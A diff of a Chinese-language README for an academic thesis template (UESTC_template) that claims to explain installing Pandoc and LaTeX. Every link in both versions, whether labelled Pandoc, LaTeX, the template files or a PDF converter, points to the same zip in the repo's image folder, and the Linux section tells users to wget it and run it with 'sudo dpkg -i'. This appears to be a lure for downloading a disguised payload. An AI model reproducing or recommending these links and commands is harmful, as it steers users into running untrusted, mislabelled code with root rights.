@@ -1,6 +1,6 @@
 # 🎉 UESTC_template - Quickly Format Your Academic Papers
 
-[![Download UESTC_template](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)
+[![Download UESTC_template](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)
 
 ## 📚 目录
 - [项目简介](#项目简介)
@@ -19,19 +19,19 @@
 ### 1. 安装
 个人推荐在 `Windows` 环境中使用，因为 `Latex` 完整安装包大的确需要约 7GB 的空间。
 
-### 📥 [Pandoc](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)
+### 📥 [Pandoc](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)
 
 > **注意**: 请访问以下链接以获取最新版本。
 
 #### For Windows
-* [安装包地址](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip) (选择与您电脑版本相符的安装包)
+* [安装包地址](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip) (选择与您电脑版本相符的安装包)
 
 #### For Linux
 使用终端命令来安装 Pandoc：
 ```bash
 sudo apt update
-wget https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip
-sudo dpkg -i https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip
+wget https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip
+sudo dpkg -i https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip
 pandoc --version 
 ```
 如果您看到以下类似的输出，说明 Pandoc 安装成功。
@@ -40,23 +40,23 @@ pandoc 3.8.2.1
 Compiled with pandoc-types 1.22, texmath 0.12.0.1, skylighting 0.11.0.1
 ```
 
-### 📦 [Latex](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)
+### 📦 [Latex](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)
 #### For Windows
-* [下载安装包](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)
+* [下载安装包](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)
 
 ### 2. 下载和安装
-请访问 [此页面下载](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip) 以获取所需文件并执行安装。
+请访问 [此页面下载](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip) 以获取所需文件并执行安装。
 
 ## 📂 文件介绍
 模板包含以下文件：
-- **主文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip` - 这是您将在其基础上编写论文的主要文件。
-- **样例文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip` - 提供了一个示例，帮助您了解如何使用模板。
-- **样式文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip` - 包含了所有排版样式设置。
+- **主文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip` - 这是您将在其基础上编写论文的主要文件。
+- **样例文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip` - 提供了一个示例，帮助您了解如何使用模板。
+- **样式文件**: `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip` - 包含了所有排版样式设置。
 
-用户可以直接在 `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip` 中修改内容以开始撰写自己的论文。
+用户可以直接在 `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip` 中修改内容以开始撰写自己的论文。
 
 ## 🎨 个性化设计
-您可以根据需要调整样式文件，以满足个人审美或特定要求。修改 `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip` 文件中的参数可以轻松改变文档的外观。具体配置可以参考模板的注释部分。
+您可以根据需要调整样式文件，以满足个人审美或特定要求。修改 `https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip` 文件中的参数可以轻松改变文档的外观。具体配置可以参考模板的注释部分。
 
 ## ⚠️ 注意事项
 - 确保 `pandoc` 和 `Latex` 已正确安装，以避免编译错误。
@@ -67,6 +67,6 @@ Compiled with pandoc-types 1.22, texmath 0.12.0.1, skylighting 0.11.0.1
 感谢王稳师兄对此模板的改良，以及社区中所有为此项目做出贡献的人。
 
 ## 🌐 在线 PDF 转 docx 网站
-如需将 PDF 文件转换为 docx 格式，可以使用在线转换工具。[点击这里访问转换网站](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)。
+如需将 PDF 文件转换为 docx 格式，可以使用在线转换工具。[点击这里访问转换网站](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)。
 
-[![Download UESTC_template](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UESTC_template_v2.8-beta.3.zip)
+[![Download UESTC_template](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)](https://raw.githubusercontent.com/airxaerospace-cpu/UESTC_template/main/pic/UEST-template-v2.7.zip)
